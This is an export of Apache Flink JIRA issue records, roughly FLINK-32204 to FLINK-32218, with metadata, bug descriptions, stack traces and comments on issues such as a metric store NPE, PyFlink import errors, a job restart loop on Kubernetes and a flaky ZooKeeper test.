<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,liangtl,liangtl,30/May/23 11:42,02/Feb/24 10:11,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,,,,,0,,,,Implement support for parent/child shard ordering in the KDS connector,,,,,,,,,,FLINK-31813,,FLINK-31989,,,,,,,,,,,,,,,,,FLINK-6349,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-30 11:42:30.0,,,,,,,,,,"0|z1i7xk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Retain metric store can cause NPE ,FLINK-32217,13538092,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,JunRuiLi,JunRuiLi,JunRuiLi,30/May/23 09:23,05/Jun/23 08:20,04/Jun/24 20:41,05/Jun/23 08:20,1.17.0,,,,,,,,,,,,,,1.16.3,1.17.2,1.18.0,,,,Runtime / Metrics,Runtime / REST,,,0,pull-request-available,,,"When metricsFetcher fetches metrics, it will update the metricsStore ([here|https://github.com/apache/flink/blob/d6c3d332340922c24d1af9dd8835d0bf790184b5/flink-runtime/src/main/java/org/apache/flink/runtime/rest/handler/legacy/metrics/MetricStore.java#LL91C44-L91C44]). But in this method, it can get null metricStore and cause NPE, which will lead to incorrect results of metrics retain, and we should also fix it from the perspective of stability.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 05 08:20:30 UTC 2023,,,,,,,,,,"0|z1i7sg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"05/Jun/23 08:20;wanglijie;Fix via:
master(1.18): 3245e0443b2a4663552a5b707c5c8c46876c1f6d
release-1.17: dfe2874b8757f942d0143e6e5ea6ed3cc13a21d6
release-1.16: bb1ae0559bd7ae24bb3da553a681d07938673c98
 ;;;",,,,,,,,,,,,,,,,,,,,,,
Delete the redundant else statement in SetOperationParseStrategy,FLINK-32216,13538070,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,jiaoqb,jiaoqb,30/May/23 06:27,30/May/23 06:39,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Table SQL / Planner,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-30 06:27:04.0,,,,,,,,,,"0|z1i7nk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Date format in flink-statefun startupPosition documentation is incorrect,FLINK-32215,13538058,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,leijurv,leijurv,30/May/23 04:06,30/May/23 14:15,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Stateful Functions,,,,0,,,,"The example string provided in [the documentation|https://nightlies.apache.org/flink/flink-statefun-docs-release-3.2/docs/modules/io/apache-kafka/] does not actually parse. It causes an exception: `Unable to parse date string for startup position: 2020-02-01 04:15:00.00 Z; the date should conform to the pattern yyyy-MM-dd HH:mm:ss.SSS Z`

[https://github.com/apache/flink-statefun/pull/329]

 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-30 04:06:54.0,,,,,,,,,,"0|z1i7l4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fetch more info in the FlinkDeployment status by using the overview API,FLINK-32214,13538054,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Not A Problem,,haoxin,haoxin,30/May/23 03:30,30/May/23 07:20,04/Jun/24 20:41,30/May/23 07:20,,,,,,,,,,,,,,,,,,,,,Kubernetes Operator,,,,0,,,,"Currently, we are using `/config` API to fetch the FlinkDeployment's basic info.
{code:java}
{
    ""refresh-interval"": 3000,
    ""timezone-name"": ""Coordinated Universal Time"",
    ""timezone-offset"": 0,
    ""flink-version"": ""1.15.3"",
    ""flink-revision"": ""c41c8e5 @ 2022-11-10T10:39:02+01:00"",
    ""features"": {
        ""web-submit"": true,
        ""web-cancel"": false
    }
} {code}
Can we switch to using `/overview` to obtain more helpful info?
{code:java}
{
    ""taskmanagers"": 27,
    ""slots-total"": 27,
    ""slots-available"": 0,
    ""jobs-running"": 27,
    ""jobs-finished"": 0,
    ""jobs-cancelled"": 2,
    ""jobs-failed"": 0,
    ""flink-version"": ""1.15.3"",
    ""flink-commit"": ""c41c8e5""
} {code}
The most useful one for me is `jobs-running`.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue May 30 07:20:27 UTC 2023,,,,,,,,,,"0|z1i7k8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"30/May/23 06:54;gyfora;If you are referring to the cluster-info field in the status, I would avoid adding more adhoc info to it. I would actually lean more toward removing what we have already than adding new things :) 

Every user/platform has different requirement and the status size is limited by Kubernetes itself. This can probably covered by a custom fork / pluggable observers later (https://issues.apache.org/jira/browse/FLINK-31857);;;","30/May/23 07:20;haoxin;Thanks;;;",,,,,,,,,,,,,,,,,,,,,
Add get off heap buffer in memory segment,FLINK-32213,13538041,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,zjureel,zjureel,zjureel,30/May/23 01:55,12/Jun/23 17:18,04/Jun/24 20:41,12/Jun/23 17:18,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Task,,,,0,pull-request-available,,,"When flink job writes data to data lake such as paimon, iceberg and hudi, the sink will write data to writer buffer first, then flush the data to file system. To manage the writer buffer better, we'd like to allocate segment from managed memory in flink and get off heap buffer to create writer buffer",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 12 17:18:34 UTC 2023,,,,,,,,,,"0|z1i7hc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/Jun/23 17:18;Weijie Guo;master(1.18) via 81cab8f486997ef666128cce4903c24d44ac7534.;;;",,,,,,,,,,,,,,,,,,,,,,
Job restarting indefinitely after an IllegalStateException from BlobLibraryCacheManager,FLINK-32212,13538019,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,mtfelisb,mtfelisb,29/May/23 17:56,04/May/24 15:57,04/Jun/24 20:41,,1.16.1,,,,,,,,,,,,,,,,,,,,Runtime / Task,,,,4,,,,"After running for a few hours the job starts to throw IllegalStateException and I can't figure out why. To restore the job, I need to manually delete the FlinkDeployment to be recreated and redeploy everything.
The jar is built-in into the docker image, hence is defined accordingly with the Operator's documentation:
{code:java}
// jarURI: local:///opt/flink/usrlib/my-job.jar {code}
I've tried to move it into /opt/flink/lib/my-job.jar but it didn't work either. 

 
{code:java}
// Source: my-topic (1/2)#30587 (b82d2c7f9696449a2d9f4dc298c0a008_bc764cd8ddf7a0cff126f51c16239658_0_30587) switched from DEPLOYING to FAILED with failure cause: java.lang.IllegalStateException: The library registration references a different set of library BLOBs than previous registrations for this job:
old:[p-5d91888083d38a3ff0b6c350f05a3013632137c6-7237ecbb12b0b021934b0c81aef78396]
new:[p-5d91888083d38a3ff0b6c350f05a3013632137c6-943737c6790a3ec6870cecd652b956c2]
    at org.apache.flink.runtime.execution.librarycache.BlobLibraryCacheManager$ResolvedClassLoader.verifyClassLoader(BlobLibraryCacheManager.java:419)
    at org.apache.flink.runtime.execution.librarycache.BlobLibraryCacheManager$ResolvedClassLoader.access$500(BlobLibraryCacheManager.java:359)
    at org.apache.flink.runtime.execution.librarycache.BlobLibraryCacheManager$LibraryCacheEntry.getOrResolveClassLoader(BlobLibraryCacheManager.java:235)
    at org.apache.flink.runtime.execution.librarycache.BlobLibraryCacheManager$LibraryCacheEntry.access$1100(BlobLibraryCacheManager.java:202)
    at org.apache.flink.runtime.execution.librarycache.BlobLibraryCacheManager$DefaultClassLoaderLease.getOrResolveClassLoader(BlobLibraryCacheManager.java:336)
    at org.apache.flink.runtime.taskmanager.Task.createUserCodeClassloader(Task.java:1024)
    at org.apache.flink.runtime.taskmanager.Task.doRun(Task.java:612)
    at org.apache.flink.runtime.taskmanager.Task.run(Task.java:550)
    at java.base/java.lang.Thread.run(Unknown Source) {code}
If there is any other information that can help to identify the problem, please let me know.

 ",Apache Flink Kubernetes Operator 1.4,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sat May 04 15:57:19 UTC 2024,,,,,,,,,,"0|z1i7cg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"04/Jul/23 19:29;rmetzger;I also just ran into this situation with the Flink K8s Operator and resolved it by regenerating the JobGraph.
To do so, I first scaled the Flink JobManager deployment to 0.
Then, I removed the ""jobGraph-yyy"" key from the ""xxx-cluster-config-map"" ConfigMap.

Next, I scaled the deployment up to 1 again, and watched the job successfully (and with state) recover from the last checkpoint.;;;","31/Aug/23 10:12;jan.drazil;The problem typically arises for me when Kubernetes decides to terminate the pod with the task manager (such as during node draining). The exception appears once the new task manager start up. I attempted to terminate other ""outdated"" task managers, and this resulted in the job starting. However, for an unknown reason, it is not recovered from the checkpoint. In my next attempt, I will explore Robert Metzger's approach.;;;","15/Dec/23 19:40;rickysaltzer;Hitting this same error after moving our jobs from being manually deployed in K8s to using ArgoCD. However, our failure is a bit different, as its not failing to deploy, but endlessly restarting at a random time after successfully running (e.g. 24 hours later). ;;;","17/Dec/23 03:20;dchristle;We also see this issue. In one case, the logs appear to show k8s scaling down the node containing the JobManager. When it restarts, it tries to redeploy the Flink application, but endlessly retries with ""The library registration references a different set of library BLOBs"" error. We are running version 1.7 of the Flink Kubernetes Operator on Flink 1.17.2, with the jar contained in the container image under the `lib` directory,;;;","03/Jan/24 18:28;sbrother;We are seeing this issue as well; it breaks our pipelines whenever the JobManager pod gets redeployed due to a spot instance scale down, etc.

As a workaround we are currently manually restarting with `kubectl rollout restart deployment/our-flink-deployment` which fixes temporarily.;;;","21/Jan/24 18:10;anuragkyal;I am running into this issue as well after my job restarts (trying to figure out the reason for random restarts) but these errors show up. Most of the times it stops after 8-10 exceptions but occasionally it gets into an infinite loop.

I am using a pubsub connector to read notifications as the first step in my job and seems like these exceptions are related to this step - at least that is what the UI says.

Was anyone able to find other solutions rather than manual intervention which I want to avoid in the middle of night.;;;","16/Feb/24 10:47;dheerajpanangat;Facing the same issue.
I see that of the 4 task managers one of them was with the naming version
task-manager-2-1
while others where
task-manager-1-2
task-manager-1-3
task-manager-1-4

Do we know when would such scenario arrive? Do we have a resolution ?;;;","15/Apr/24 16:35;rickysaltzer;Verified we started hitting this pretty consistently when using K8s + Karptenter with spot instances. ;;;","29/Apr/24 13:05;rmetzger;Thanks [~rickysaltzer]. Have you figured out what exactly is triggering this?

If I remember correctly, I was able to trigger it by regenerating the JobGraph on the JobManager (while keeping the jobid the same) and resubmitting the job (e.g. job would restart) while keeping TaskManagers running.
So probably some integrity check on the TaskManager noticed that the jars of a jobid have changed, causing this exception.
For debugging this, I'd like to find an easy way of reproducing it. My approach seems somewhat ""illegal"", because messing with the JobGraph that not what Flink has been designed for (in my understanding).
So I'm asking if somebody who has observed this issue has a reliable way (and a way of using Flink in an expected / documented manner) to reproduce this issue?;;;","04/May/24 15:57;rickysaltzer;Hey [~rmetzger] - I'm also having a hard time reproducing at the moment but from what I can tell...the issue happens when the JobManager is lost and recreated, but the TaskManager K8s pods remain online (to be reused) by the new JobManager. It does appear to be somewhat inconsistent in that way too, because the fix for me is to manually delete the JobManager pod and hope the next startup works (usually does). ;;;",,,,,,,,,,,,,
Supports row format in ExecutorImpl for jdbc driver,FLINK-32211,13537968,13528918,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,zjureel,zjureel,zjureel,29/May/23 06:36,31/May/23 05:30,04/Jun/24 20:41,31/May/23 05:30,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Client,,,,0,pull-request-available,,,"Current ExecutorImpl only use RowFormat.PLAIN_TEXT for results, it should support JSON for complex data type such as map/array for jdbc driver",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed May 31 05:30:48 UTC 2023,,,,,,,,,,"0|z1i714:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"31/May/23 05:30;libenchao;Fixed via https://github.com/apache/flink/commit/81902e81c43990c48d05ec81469b7d99c7922698

[~zjureel] Thanks for the PR!;;;",,,,,,,,,,,,,,,,,,,,,,
Error import Pyflink.table.descriptors due to python3.10 version mismatch,FLINK-32210,13537898,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Cannot Reproduce,,aomidvar,aomidvar,27/May/23 17:20,16/Oct/23 12:40,04/Jun/24 20:41,16/Oct/23 12:40,1.13.0,,,,,,,,,,,,,,,,,,,,API / Python,Connectors / Kafka,Connectors / MongoDB,,0,,,,"Following to the issue[jira] [Created] https://issues.apache.org/jira/browse/FLINK-32207(FLINK-32206) I decided to install latest 1.13 version where Kafka and Json imports are working which needed to create env python 3.8. I faced a few issues

 

1: CommandNotFoundError: Your shell has not been properly configured to

 

use 'conda activate'. To initialize your shell, run $ conda init

<SHELL_NAME> Currently supported shells are: - bash - fish - tcsh -

xonsh - zsh - powershell See 'conda init --help' for more information

and options. IMPORTANT: You may need to close and restart your shell

after running 'conda init'.

 

2. I tried to initiate but the new error faced 

 

No Pyflink module found",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,https://github.com/aomidvar/alibabainpersia/blob/d64a1d12c247237f382a46d09e28ca71bf65aa9b/importpyflink_test_py38-env.ipynb,,,,,,,,,,9223372036854775807,,,,2023-05-27 17:20:40.0,,,,,,,,,,"0|z1i6lk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Opensearch connector should remove the dependency on flink-shaded,FLINK-32209,13537831,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Won't Do,reta,reta,reta,26/May/23 16:31,26/May/23 17:23,04/Jun/24 20:41,26/May/23 17:23,opensearch-1.0.1,,,,,,,,,,,,,,opensearch-1.1.0,,,,,,Connectors / Opensearch,,,,0,,,,"The Opensearch connector depends on flink-shaded. With the externalization of the connector, the connectors shouldn't rely on Flink-Shaded",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri May 26 17:22:47 UTC 2023,,,,,,,,,,"0|z1i66w:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"26/May/23 17:22;reta;Already fixed by https://github.com/apache/flink-connector-opensearch/commit/85e9cad4f09519543e149530f8a61b2635ca506e;;;",,,,,,,,,,,,,,,,,,,,,,
Remove dependency on flink-shaded from flink-connector-aws,FLINK-32208,13537819,,Technical Debt,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,Sergey Nuyanzin,Sergey Nuyanzin,Sergey Nuyanzin,26/May/23 14:52,30/Jun/23 15:44,04/Jun/24 20:41,30/Jun/23 15:44,,,,,,,,,,,,,,,aws-connector-4.2.0,,,,,,Connectors / AWS,Connectors / DynamoDB,,,0,pull-request-available,,,"The AWS connectors depend on flink-shaded. With the externalization of connector, connectors shouldn't rely on Flink-Shaded but instead shade dependencies such as this one themselves",,,,,,,,,,,,,,,,,,FLINK-32499,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 30 15:44:55 UTC 2023,,,,,,,,,,"0|z1i648:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"30/Jun/23 15:44;dannycranmer;merged commit [{{6484f9d}}|https://github.com/apache/flink-connector-aws/commit/6484f9d1d80f61247c78c7e6ba6856820321ef02] into apache:main;;;",,,,,,,,,,,,,,,,,,,,,,
Error import Pyflink.table.descriptors due to python3.10 version mismatch,FLINK-32207,13537811,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Duplicate,,aomidvar,aomidvar,26/May/23 14:06,14/Jun/23 12:39,04/Jun/24 20:41,14/Jun/23 12:39,1.17.0,,,,,,,,,,,,,,1.17.1,,,,,,API / Python,,,,0,,,,"Gentlemen,
 
 
 
I have problem with some apache-flink modules. I am running a 1.17.0 apache- flink and I write test codes in Colab I faced a problem for import modules 
 
 
 
 
from pyflink.table import DataTypes 
 
from pyflink.table.descriptors import Schema, Kafka, Json, Rowtime 
 
from pyflink.table.catalog import FileSystem 
 
 
 
 
not working for me (python version 3.10) 
 
 
Any help is highly appreciated the strange is that other modules importing fine.  I checked with your Github but didn't find these on yours too which means modules are not inside your descriptor.py too. I think it needed installation of connectors but it failed too. 
 
 
 
 
Please see the link below: 
 
 
 
 
 
[https://github.com/aomidvar/scrapper-price-comparison/blob/d8a10f74101bf96974e769813c33b83d7a71f02b/kafkaconsumer1.ipynb]
 
 
 
 
I am running a test after producing the stream ([https://github.com/aomidvar/scrapper-price-comparison/blob/main/kafkaproducer1.ipynb]) to Confluent server and I like to do a flink job but the above mentioned modules are not found with the following links in collab:
 
 
That is not probably a bug. Only version of apache-flink now working on colab is 1.17.0. I prefer 3.10 but installed a virtual python 3.8 env and between different modules found out that Kafka and Json modules are not in descriptors.py of version 1.17 Apache-flink default. But modules exist in Apache-flink 1.13 version.
[https://colab.research.google.com/drive/1aHKv8WA6RA10zTdwdzUubB5K0anEmOws?usp=sharing]
[https://colab.research.google.com/drive/1eCHJlsb8AjdmJtPc95X3H4btmFVSoCL4?usp=sharing]
 
I've got this error for Json, Kafka ...
---------------------------------------------------------------------------
 
 ImportError Traceback (most recent call last) <ipython-input-1-203af9e2c559> in <cell line: 2>() 1 from pyflink.table import DataTypes ----> 2 from pyflink.table.descriptors import Schema, Kafka, Json, Rowtime 3 from pyflink.table.catalog import FileSystem ImportError: cannot import name 'Kafka' from 'pyflink.table.descriptors' (/usr/local/lib/python3.10/dist-packages/pyflink/table/descriptors.py) 
 
---------------------------------------------------------------------------
 
 NOTE: If your import is failing due to a missing package, you can manually install dependencies using either !pip or !apt. To view examples of installing some common dependencies, click the ""Open Examples"" button below.
 
 ---------------------------------------------------------------------------
 
I have doubt that if current error is related to a version and dependencies then 
 
I have to ask the developer if I do this python 3.8 env is that possible to get solved?
 
 
Thanks for your time ,
 ","Colab

Python3.10 ",,,,,,,,,,,,,,,,,,,FLINK-32206,,,,,,,,,,,,"26/May/23 14:05;aomidvar;image (1).png;https://issues.apache.org/jira/secure/attachment/13058578/image+%281%29.png","26/May/23 14:05;aomidvar;image (2).png;https://issues.apache.org/jira/secure/attachment/13058579/image+%282%29.png",,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,https://github.com/aomidvar/scrapper-price-comparison/blob/d8a10f74101bf96974e769813c33b83d7a71f02b/kafkaconsumer1.ipynb,,,,,,,,,,9223372036854775807,,,english,Wed Jun 14 12:38:56 UTC 2023,,,,,,,,,,"0|z1i62g:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"14/Jun/23 12:38;dianfu;This seems duplicate with FLINK-32206. Closing this ticket~. Feel free to reopen it if I misunderstood the problem.;;;",,,,,,,,,,,,,,,,,,,,,,
ModuleNotFoundError for Pyflink.table.descriptors wheel version mismatch,FLINK-32206,13537810,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Information Provided,,aomidvar,aomidvar,26/May/23 14:02,16/Oct/23 12:39,04/Jun/24 20:41,16/Oct/23 12:39,1.17.0,,,,,,,,,,,,,,,,,,,,API / Python,Connectors / Kafka,Connectors / MongoDB,,0,,,,"Gentlemen,

I have problem with some apache-flink modules. I am running a 1.17.0 apache- flink and I write test codes in Colab I faced a problem on importing Kafka, Json and FileSystem  modules 
 
from pyflink.table.descriptors import Schema, Kafka, Json, Rowtime 
from pyflink.table.catalog import FileSystem 
 
not working for me (python version 3.10) 
 
Any help is highly appreciated the strange is that other modules importing fine.  I checked with your Github but didn't find these on official version too which means modules are not inside the descriptor.py in newer version. 
 
Please see the link below: 
 

[https://github.com/aomidvar/scrapper-price-comparison/blob/d8a10f74101bf96974e769813c33b83d7a71f02b/kafkaconsumer1.ipynb]
 
 
I am running a test after producing the stream ([https://github.com/aomidvar/scrapper-price-comparison/blob/main/kafkaproducer1.ipynb]) to Confluent server and I like to do a flink job but the above mentioned modules are not found with the following links in collab:
 
That is probably an easy fix bug. Only version of apache-flink now working on colab is 1.17.0. I prefer 3.10 but installed a virtual python 3.8 env and between different modules found out that Kafka and Json modules are not in descriptors.py of version 1.17 Apache-flink default. But modules exist in Apache-flink 1.13 version.
[https://colab.research.google.com/drive/1aHKv8WA6RA10zTdwdzUubB5K0anEmOws?usp=sharing]
[https://colab.research.google.com/drive/1eCHJlsb8AjdmJtPc95X3H4btmFVSoCL4?usp=sharing]
 
I've got this error for Json, Kafka ...
---------------------------------------------------------------------------
 
 ImportError Traceback (most recent call last) <ipython-input-1-203af9e2c559> in <cell line: 2>() 1 from pyflink.table import DataTypes ----> 2 from pyflink.table.descriptors import Schema, Kafka, Json, Rowtime 3 from pyflink.table.catalog import FileSystem ImportError: cannot import name 'Kafka' from 'pyflink.table.descriptors' (/usr/local/lib/python3.10/dist-packages/pyflink/table/descriptors.py) 
 
---------------------------------------------------------------------------
 
 NOTE: If your import is failing due to a missing package, you can manually install dependencies using either !pip or !apt. To view examples of installing some common dependencies, click the ""Open Examples"" button below.
 
 ---------------------------------------------------------------------------
 
I have doubt that if current error is related to a version and dependencies then 
 
I have to ask the developer if I do this python 3.8 env is that possible to get solved?
 
 
Thanks for your time ,
 ",,,,,,,,,,,,,,,,,,FLINK-32207,,,,,,,,,,,,,,"26/May/23 14:54;aomidvar;image (1).png;https://issues.apache.org/jira/secure/attachment/13058581/image+%281%29.png","26/May/23 14:54;aomidvar;image (2).png;https://issues.apache.org/jira/secure/attachment/13058580/image+%282%29.png",,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,https://github.com/aomidvar/scrapper-price-comparison/blob/d8a10f74101bf96974e769813c33b83d7a71f02b/kafkaconsumer1.ipynb,,,,,,,,,,9223372036854775807,,,Python,Wed Jun 14 12:36:53 UTC 2023,,,,,,,,,,"0|z1i628:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"14/Jun/23 12:36;dianfu; 'Kafka' has already been removed from 'pyflink.table.descriptors'. I guess you are referring an outdated example.;;;",,,,,,,,,,,,,,,,,,,,,,
Support Flink client to access REST API through K8s Ingress,FLINK-32205,13537767,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,huwh,huwh,huwh,26/May/23 08:04,28/Jun/23 11:56,04/Jun/24 20:41,26/Jun/23 02:52,1.17.0,,,,,,,,,,,,,,1.18.0,,,,,,Command Line Client,,,,0,pull-request-available,,,"Currently, Flink Client can only connect to the server through the address:port, which is configured by the rest.address and rest.port.

But when running Flink on Kubernetes and exposing services through ingress. The URL to access the Flink server should be: http://\{proxy address}/\{some prefix path to identify flink clusters}/\{flink real path}

I'd like to introduce an option named ""rest.url-prefix"" to support adding a prefix to URLs in RestClient.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jun 28 11:56:03 UTC 2023,,,,,,,,,,"0|z1i5so:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"28/Jun/23 11:56;guoyangze;master: 50952050057b1655e6a81e844cefa377db66d277;;;",,,,,,,,,,,,,,,,,,,,,,
ZooKeeperLeaderElectionTest.testZooKeeperReelectionWithReplacement fails with The ExecutorService is shut down already. No Callables can be executed on AZP,FLINK-32204,13537766,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Fixed,mapohl,Sergey Nuyanzin,Sergey Nuyanzin,26/May/23 08:03,13/Jun/23 07:16,04/Jun/24 20:41,13/Jun/23 07:16,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,pull-request-available,test-stability,,"[This build|https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49386&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8&l=7095] fails as
{noformat}

May 25 18:45:50 Caused by: java.util.concurrent.RejectedExecutionException: The ExecutorService is shut down already. No Callables can be executed.
May 25 18:45:50 	at org.apache.flink.util.concurrent.DirectExecutorService.throwRejectedExecutionExceptionIfShutdown(DirectExecutorService.java:237)
May 25 18:45:50 	at org.apache.flink.util.concurrent.DirectExecutorService.submit(DirectExecutorService.java:100)
May 25 18:45:50 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.recipes.cache.TreeCache.publishEvent(TreeCache.java:902)
May 25 18:45:50 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.recipes.cache.TreeCache.publishEvent(TreeCache.java:894)
May 25 18:45:50 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.recipes.cache.TreeCache.access$1200(TreeCache.java:79)
May 25 18:45:50 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.recipes.cache.TreeCache$TreeNode.processResult(TreeCache.java:489)
May 25 18:45:50 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.imps.CuratorFrameworkImpl.sendToBackgroundCallback(CuratorFrameworkImpl.java:926)
May 25 18:45:50 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.imps.CuratorFrameworkImpl.processBackgroundOperation(CuratorFrameworkImpl.java:683)
May 25 18:45:50 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.imps.WatcherRemovalFacade.processBackgroundOperation(WatcherRemovalFacade.java:152)
May 25 18:45:50 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.imps.GetDataBuilderImpl$3.processResult(GetDataBuilderImpl.java:272)
May 25 18:45:50 	at org.apache.flink.shaded.zookeeper3.org.apache.zookeeper.ClientCnxn$EventThread.processEvent(ClientCnxn.java:634)
May 25 18:45:50 	at org.apache.flink.shaded.zookeeper3.org.apache.zookeeper.ClientCnxn$EventThread.run(ClientCnxn.java:553)
May 25 18:45:50
